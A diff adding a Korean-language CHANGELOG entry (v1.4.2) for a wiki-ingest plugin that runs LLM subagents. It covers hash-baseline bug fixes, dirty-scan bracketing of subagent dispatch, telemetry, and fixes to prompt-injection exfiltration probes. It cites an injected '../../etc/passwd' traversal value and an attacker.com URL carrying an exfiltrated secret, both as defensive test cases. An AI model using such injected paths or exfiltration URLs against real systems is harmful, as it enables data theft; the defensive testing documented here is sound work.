@@ -2,6 +2,258 @@
 
 deep-wiki의 주요 변경사항을 기록합니다.
 
+## [1.4.2] — 2026-05-07
+
+`docs/handoff-2026-05-06-v1.4.2.md`의 v1.4.1 backlog 4개 항목을 닫는 패치
+릴리스. 두 개는 v1.4.1 cache-active dogfood에서 발견된 현장 이슈 수정
+(F1, F2 — F2는 /deep-review round 1 I1에서 deferred되었음); 두 개는
+보류된 품질 항목 (B3 phase 텔레메트리 — v1.4.0 plan §10.2; I2 V-2/V-3
+probe 전체 URL 매칭 — /deep-review round 1+2). single-source + multi-source
+ingest 경로는 v1.4.1과 spec-equivalent (NOT byte-identical — F1
+disk-authoritative read + F2 §3.9 4번째 invocation site가 runtime
+invariant를 변경). 위키 스키마는 additive only (`ingest` log 라인의
+`phase_timing_ms` 필드; `wiki-lint` Step 6 LOG-INVARIANT scan 영향 없음).
+
+**v1.4.1 §11.5의 known-limitations 필수 verbatim 언어 계승 (재기재):**
+
+- **L1**: V-0 PASS (Mechanism B 경유)는 best-effort — Claude Code 런타임이
+  dispatch metadata API를 노출하지 않음. Track C v2는 런타임 API 지원 시까지
+  v1.5.0+로 보류. **v1.4.2 추가:** I2 fix가 V-2/V-3 probe fidelity 개선
+  (full-URL allowlist 비교)을 적용했으나, v1.4.1 final agent files 대상
+  empirical SECOND run은 sandbox orchestration 워크스트림으로 보류 —
+  CHANGELOG는 SECOND run 완료 시까지 "best-effort" 프레이밍 유지하고
+  empirical addendum 미추가.
+- **L2**: §3.9 dirty-scan은 `<wiki_root>/`-internal mutation만 catch;
+  off-root 쓰기 (예: `/tmp/`)는 NOT detected. v1.4.0 dogfood 실패 mode
+  (workers writing `/tmp/v140-workers-out/*`)는 §3.9로 안 잡힘. v1.4.1은
+  layered defense-in-depth였고, v1.4.2 F2는 single-source Stage 1 dispatch
+  도 bracketing에 추가하나 off-root scope 확대는 아님. Process-level
+  sandboxing은 여전히 v1.5.0+ scope.
+
+### 버그 픽스
+
+- **F1 (HIGH) — synthesizer `existing_page_body` truncation으로 인한 C3
+  false-positive abort.** v1.4.1 cache-active dogfood (post-`/reload-plugins`)
+  에서 Stage 1 LLM이 update 항목의 `existing_page_body`를 극심하게 truncate
+  하여 emit하는 현상 관측 (12377 bytes disk → 725 bytes emit; 20071 bytes
+  disk → 587 bytes emit). main이 truncated bytes로 C3 hash baseline을 계산
+  → Step 7.6.C C3 check가 실제 disk bytes와 비교 시 항상 "concurrent ingest
+  detected"로 판정 → 모든 update가 abort. v1.4.2 contract: main이 Stage 1
+  return 후 disk에서 페이지를 다시 읽어 disk bytes를 C3 hash baseline AND
+  Stage 2 worker / inline-write synthesis context로 통일. 이전 P6 round-1
+  hash-from-emit 컴퓨트 패스를 흡수 — main이 disk를 직접 읽으므로 별도 컴퓨트
+  불필요. `agents/wiki-synthesizer-analysis.md` Rule 4를 강화하여 FULL VERBATIM
+  bytes 요구 (방어적 contract; synthesizer가 short emit해도 main이 disk에서
+  authoritatively recovery). single-source 경로에만 적용 — multi-source A4
+  (worker, analysis-mode 아님)는 항목에 `existing_body_hash` 필드가 없음.
+
+  **Post-impl review fixup (v1.4.2 impl branch에서 3-way /deep-review 후
+  merge 전 적용):**
+  - **F1.1 (2/3 reviewer agreement)** — sub-threshold drift escalation.
+    Stage 1의 `inline_bodies`는 main의 disk re-read 이전에 이미 truncated
+    emit으로 생성됨. drift 발생한 항목의 inline_bodies를 그대로 쓰면 Rule 5
+    + `preserve_sections` merge 로직이 partial context로 작동해 unrelated
+    section silent corruption 위험. v1.4.1 이전은 C3 abort로 LOUDLY 실패.
+    Fix: ANY drift 발생 시 sub-threshold 항목을 A5 fanout으로 escalate하여
+    Stage 2 page-writer worker가 disk-bytes context로 re-synthesize. Stale
+    inline_bodies 폐기. v1.4.1 LOUD-failure property 보존 + retry-correctness
+    회복.
+  - **F1.2 (2/3 reviewer agreement)** — Step 7.6.C reset에서 PARTIAL_FAIL
+    보존. F1 gate가 FAILED_PAGES 채우고 PARTIAL_FAIL=true 설정한 뒤 Step
+    7.6.C 진입 시 reset 발생 → P5 패턴이 FAILED_WORKERS만 re-toggle →
+    F1-드롭된 페이지는 sentinel 미포함 → 다음 세션 retry 누락. Fix: P5
+    패턴 미러 — `if [[ ${#FAILED_PAGES[@]} -gt 0 ]]; then PARTIAL_FAIL=true; fi`.
+  - **F1.3 (single-reviewer Codex P1)** — basename traversal guard. F1 gate
+    가 `page_path="$WIKI_ROOT/pages/${entry.file}"` 구성 후 cat을 Step
+    7.6.C basename 가드 BEFORE 실행 → prompt-injected
+    `entry.file = "../../etc/passwd"`가 wiki_root 외부 read. Fix:
+    `^[a-z0-9][a-z0-9-]*\.md$` regex를 page_path 구성 BEFORE 적용
+    (Step 7.6.B Gate 3.5 + Step 7.6.C defense-in-depth와 동일).
+  - **F1.4 + F1.5 (single-reviewer Opus C2 + C3)** — agent doc + CHANGELOG
+    정확성. Pre-fixup 표현 "byte-identical Stage 3 hashing" 과 "synthesizer
+    의 existing_page_body가 Stage 2 worker로 흐름"은 둘 다 v1.4.2 F1 이후
+    부정확. `$(cat …)`는 trailing newline strip하므로 v1.4.1
+    `printf '%s' "$emit"` hashing과 asymmetric. main이 synth bytes를
+    UNCONDITIONALLY disk bytes로 overwrite. Fix: byte-identical 표현 제거,
+    Stage 3 결정은 symmetric `$(cat)` byte-stripping으로 equivalent임을
+    문서화; Rule 4 + field semantic을 synth bytes → telemetry-only contract
+    로 재작성.
+  - **R2.F1.6 (2/3 reviewer agreement, 2nd-round /deep-review)** —
+    concurrent-ingest baseline race. Pre-R2 fixup의 F1 size-delta
+    heuristic (>4 bytes 시 escalate)은 LARGE drift만 감지. Stage 1 LLM
+    실행 중 concurrent `/wiki-ingest` commit이 same-size byte change
+    (또는 EOL tolerance band 안의 truncation pattern)를 만들면 silent
+    baseline → C3 통과 → 우리 세션이 concurrent commit 덮어쓰기. Fix:
+    size-delta를 synth emit hash vs disk read hash HASH-COMPARE로 교체.
+    byte 단위 차이 발생 시 F1_DRIFT_DETECTED → F1.1 escalation 통해 A5
+    fanout 강제. Stage 2 worker가 현재 disk bytes로 re-synthesize —
+    concurrent commit 내용은 worker input으로 보존, 우리 source 기여는
+    그 위에 merge. T0→T1 (Stage 1 read → F1 cat) silent window 갭 차단.
+  - **R2.F1.7 (2/3 reviewer agreement, 2nd-round /deep-review)** —
+    all-dropped → terminal ingest-skip bypass. Pre-R2 fixup `len(page_plan)
+    == 0`은 무조건 `do_ingest_skip_terminal_under_lock` 경로 → ingest-skip
+    log + source promote. F1이 모든 update 항목 drop (basename invalid /
+    page absent / disk read failed) 시 partial_fail sentinel 미작성으로
+    source가 clean skip으로 promote → 다음 세션 retry 안 함 → permanent
+    silent failure. Fix: empty-page_plan terminal skip을 FAILED_PAGES
+    EMPTY일 때만 trigger. non-empty (all-F1-dropped) 시 신규
+    `do_all_failed_under_lock` (Step 7.5.B) 경로로 route — Step 7.7.B
+    "all-fail" finalization mirror: lock 획득, source slug에 partial_fail
+    sentinel 작성, `pages_failed=[F1-dropped]` 포함된 `ingest` log line
+    emit, `.pending-scan` 미승격.
+
+**3rd-round /deep-review fixups (5 critical + 2 warning, 모두 ACCEPT):**
+
+2nd-round fixup commit이 `do_all_failed_under_lock` (신규 ~30줄 함수)을
+도입. 3rd-round /deep-review가 이 신규 코드에서 5 critical + 2 warning을
+발견 — v1.4.2 base 디자인이 아닌 신규 함수 자체의 regression.
+
+  - **R3.P2.1 (2/3 reviewer agreement, Codex review P2 + Codex
+    adversarial high)** — slug vs descriptor mismatch. Caller가
+    `SOURCES[0]` (descriptor encoding `slug|origin|type`)을 함수의 첫
+    인자로 전달했으나 함수는 `slug` 기대. yaml path가 `<wiki>/.wiki-meta/
+    sources/<slug|origin|type>.yaml`로 잘못 구성 → partial_fail sentinel이
+    canonical location에 안 떨어짐 → Step 1.5 partial-fail-recovery
+    detection 미스. Fix: caller가 `slug="${SOURCES[0]%%|*}"` 추출 후 전달.
+  - **R3.P2.2 (2/3 reviewer agreement, Codex review P2 + Codex
+    adversarial medium)** — 3-strike retry counter 누락. Step 7.5.M-D
+    multi-source 경로에는 `<wiki>/.wiki-meta/.pending-scan-retry-count`
+    counter가 stuck-window 복구용으로 존재 (3번째 동일-window 실패 시
+    `ingest-fail` action emit + `.pending-scan` promote). pre-R3 fixup의
+    `do_all_failed_under_lock`은 이 counter를 증가시키지 않아 persistent
+    F1 all-drop (예: synthesizer가 absent page를 반복 hallucinate) 시
+    indefinite loop. Fix: Step 7.5.M-D 패턴 mirror — counter 읽기 +
+    증가, count≥3 시 `ingest-fail` emit + promote, 그 외에는 `ingest`
+    + `pages_failed` emit.
+  - **R3.C-1 (single-reviewer Opus)** — `mkdir … exit 1` 처리 오류.
+    pre-R3 fixup의 `mkdir … || { echo "Wiki locked"; exit 1; }`은 caller의
+    user-facing exit message 이전 + benign concurrent-ingest 케이스의
+    partial_fail signal 작성 이전에 script termination. Fix: soft-fail
+    `if ! mkdir … 2>/dev/null; then echo WARN; return 1; fi`. + 명시적
+    rmdir 후 `trap - EXIT` 추가 (Step 7.7.B + Step 7.6.G 패턴 mirror).
+  - **R3.C-2 (single-reviewer Opus)** — first-ingest baseline yaml
+    materialization 누락. Step 7.7.B의 R4-Adv-Adv-2 fix는 source yaml이
+    아직 없는 경우 (brand-new source의 첫 ingest가 all-fail 명중)
+    baseline yaml을 명시적으로 materialize. `do_all_failed_under_lock`은
+    Step 7.7.B mirror라고 주장했지만 이 block 누락 → first-ingest
+    all-F1-dropped 시 partial_fail block만 있고 `id/type/origin/
+    content_hash/pages_created/pages_updated` 없는 corrupt yaml 생성.
+    Fix: 함수 entry에 동일 baseline materialization block inline.
+  - **R3.C-3 (single-reviewer Opus)** — `FAILED_PAGE_FILES` parallel
+    array 채움 누락. F1 loop가 `FAILED_PAGES`만 push했고 함수 body의
+    `printf '%s\n' "${FAILED_PAGE_FILES[@]}" | jq -R . | jq -s -c .`
+    전개가 `set +u`에서는 `[""]` (W1 round-2 bug shape) 생성, `set -u`
+    에서는 unbound-variable abort. 둘 다 R2.F1.7 의도 무력화. Fix: F1
+    `FAILED_PAGES+=` push 다음에 명시적 `FAILED_PAGE_FILES+=("${entry.file}")`
+    추가 (3 site — basename invalid / page absent / disk read fail) +
+    `if sources_count == 1:` block 상단에 명시적 `FAILED_PAGES=()`
+    `FAILED_PAGE_FILES=()` init.
+  - **R3.W-1 (single-reviewer Opus)** — `phase_timing_ms.stage_3_write`
+    공식 오류. pre-R3 fixup은 `LOG_EMIT_MS - INGEST_T0_MS` 계산 — `total`과
+    동일하여 `total >= sum(stages)` invariant 위반. Fix: caller가 함수
+    호출 직전에 `STAGE_3_START_MS_FAIL` 캡처; 함수 compute는
+    `LOG_EMIT_MS - STAGE_3_START_MS_FAIL`로 stage_3_write를 lock+yaml+log
+    emit으로 한정. B3.1 path-coverage matrix에 "Single-source F1
+    all-dropped" 행 추가.
+  - **R3.W-2 (single-reviewer Opus)** — reason taxonomy 정규화. pre-R3
+    fixup은 `"all_f1_dropped"` (snake_case) 사용했으나 기존 Step 7.6.F
+    vocabulary는 space-separated phrases (`"stage 2 worker fail"`,
+    `"all workers failed"`). Fix: `"all f1 dropped"`로 정규화 + line
+    ~2068의 inline taxonomy에 추가.
+
+- **F2 (MEDIUM) — single-source Stage 1 dispatch §3.9 bracketing gap.**
+  v1.4.1의 §3.9 worker-mutation dirty-scan brackets는 3개 dispatch site
+  (Step 7.5.M-A multi-source A4 fanout, Step 7.5.M-B Case B2 collision
+  second-pass, Step 7.6.B-post single-source A5 fanout)에서만 작동했고
+  single-source Stage 1 analysis dispatch (Step 7.5의
+  `invoke deep-wiki:wiki-synthesizer-analysis`)는 bracketing 안 됨. 잘못
+  resolve되거나 downgrade된 analysis subagent가 Stage 1 LLM 실행 중
+  `<wiki_root>/`을 mutate해도 미감지. v1.4.2는 4번째 invocation site (label
+  `"A5-analysis"`)를 추가하여 Stage 1 dispatch를 직접 bracketing. dispatch
+  전 pre-snapshot, Stage 1 return 후 page_plan 분기 결정 전 post-scan
+  (sub-threshold inline vs. A5 fanout downstream 분기와 무관 — Stage 1
+  mutation을 분기 결정 이전에 catch). `WIKI_TEST_MODE=1` env-gated;
+  프로덕션 비용 변동 없음.
+
+### 텔레메트리
+
+  **Post-impl review fixup (B3.1, single-reviewer Opus C1)** — path-coverage
+  matrix vs Step 10 omission rule self-contradiction. Pre-fixup matrix는
+  `Single-source empty page_plan terminal-skip`, `Re-ingest hash-skip`,
+  `Ingest-fail / 3-strike abort` 경로에 phase_timing_ms schema를 명시했으나,
+  Step 10 omission rule은 `ingest` lifecycle action 라인에만 emit한다고
+  정의 (`ingest-skip` / `ingest-repair` / `ingest-fail` 제외). Fix:
+  path-coverage matrix를 4-column 표로 재작성하여 "phase timing emitted"
+  vs "Step 10 bypass" 구분 + per-stage 설명. W3 fixup도 함께 적용 —
+  delta-compute pseudocode에 `${var:-0}` defaultization 추가하여 set -u
+  tolerant.
+
+- **B3 — `log.jsonl` `ingest` 라인의 `phase_timing_ms`.** v1.4.0 plan
+  §10.2에서 보류된 항목. v1.4.0 dogfood가 ~17분 wall-clock 측정 + Stage 1
+  ~7분 + Stage 2 ~10분 일화적 split만 기록 — log.jsonl에 per-phase timing
+  미기록으로 사후 검증 불가. v1.4.2는 `_ts_ms` helper (Bash 3.2 portable;
+  python3 우선으로 ms 정밀도, `date +%s000` 폴백으로 초 정밀도) 추가하고
+  Step 1 entry / Step 7.5 single-source / Step 7.5.M-A multi-source /
+  Step 7.6.A A5 fanout / Step 7.6.B-post / Step 7.6.C Stage 3 lock acquire /
+  Step 7.5.M-C multi-source atomic-write entry / Step 10 log emit
+  지점에서 timestamp 캡처. ingest 라인이 새 필드
+  `phase_timing_ms: {stage_1_analysis, stage_2_fanout, stage_3_write,
+  total}` (모두 ms 정수) 발신. **Schema-additive** —
+  `wiki-lint` Step 6 LOG-INVARIANT scan은
+  `select(.action != "ingest-repair") | .pages_created[]?`로 필터하여
+  unknown top-level 필드 무시. 비-`ingest` lifecycle action (ingest-skip,
+  ingest-repair, ingest-fail, lint, rebuild, delete, query-filed, setup)
+  에서는 필드 생략. 프로덕션 비용: ingest당 ~12 ms (Python 시작 비용이
+  지배적; warm-cache 시 ~2ms 6회), 분 단위 LLM 단계 대비 무시할 수준.
+
+### 테스트 인프라 (probe 품질)
+
+- **I2 — V-2/V-3 WebFetch probe 전체 URL allowlist 비교.** /deep-review
+  round 1+2 (Codex review, single-reviewer가 두 번 raise) 발견. 이전
+  `scripts/v0-probe/v2-v3-record.sh`는 stub log column 3 (path) 만 기록하고
+  allowlist URL의 path 컴포넌트와 비교 → 주입된
+  `https://attacker.com/v2-probe-feed?data=<exfiltrated_secret>`이 허용된
+  `https://example.com/v2-probe-feed`와 path-only 비교에서 일치 → false-pass
+  surface 발생. v1.4.2는 `scripts/v0-probe/webfetch-stub-server.py`에 6번째
+  TSV 컬럼 (`<host>`, request Host header) 추가하고 `v2-v3-record.sh`가
+  `<host><path>?<query>` (scheme stripped) 형태로 full URL 추출하여 정규화된
+  allowlist URL과 비교. backward-compatible: 5-column 사전-v1.4.2 로그는
+  lossy-mode detection이 작동하여 path-only 비교로 degrade되며 notes 컬럼에
+  `lossy-pre-v1.4.2-log: ...` annotation 추가. 테스트 인프라 한정 —
+  프로덕션 에이전트 동작 영향 없음.
+
+  **Post-impl review fixup (W4, single-reviewer Opus)** — 빈 로그
+  short-circuit. Pre-fixup format-detect awk가 빈 로그 파일을 "not new
+  format" 판정하여 `lossy-pre-v1.4.2-log` annotation 추가 → 실제는 clean
+  PASS shape (요청 없음 = exfil 시도 없음)인데 degraded probe infrastructure
+  운용으로 잘못 표시. Fix: format detection 이전에 `[ ! -s "$WEBFETCH_LOG" ]`
+  short-circuit 추가하여 빈 파일을 explicit empty PASS로 처리.
+
+### 마이그레이션
+
+v1.4.1 대비 외부 API 변경 없음. 내부 계약 변경은 F1의 `existing_body_hash`
+disk-authoritative read: hashing은 Stage 3 안에서 일관됨 — F1 캡처와 C3
+re-check가 둘 다 `$(cat …)` byte-stripping (POSIX command substitution이
+trailing newline 제거)을 쓰므로 C3 비교는 symmetric하고 concurrent-ingest
+detection은 유지됨. Hash 값은 v1.4.1과 byte-identical은 아님 (v1.4.1은
+`printf '%s' "$emit"` hashing으로 compliant agent의 trailing newline 보존,
+v1.4.2는 `$(cat)` output을 hashing하여 strip) — 그러나 Stage 3 success/abort
+결정은 spec-compliant agent 기준 equivalent. non-compliant emit (truncation
+drift)는 `WARN: synthesizer existing_page_body drift for ...` stderr 라인
+발신. Drift 발생한 sub-threshold 경로는 A5 fanout으로 escalate (post-review
+F1.1 fixup)되어 Stage 2 worker가 disk-bytes context에서 re-synthesize —
+v1.4.1 LOUD-failure property를 affected page에 보존하면서
+retry-correctness 복구.
+
+### 감사
+
+- Handoff doc `docs/handoff-2026-05-06-v1.4.2.md` (gitignored 작성자
+  아티팩트)이 F1+F2+B3+I2 backlog 순서를 정함.
+- v1.4.1 cycle의 /deep-review round 1+2 (Opus + Codex review + Codex
+  adversarial)이 F2 (round 1 I1)와 I2 (round 1+2, single-reviewer Codex
+  두 번)를 flag.
+- v1.4.1 cache-active dogfood (handoff §0)에서 F1 발견.
+
 ## [1.4.1] — 2026-05-06
 
 신뢰 경계 폐쇄 (best-effort, layered defense). 단일 `wiki-synthesizer.md`
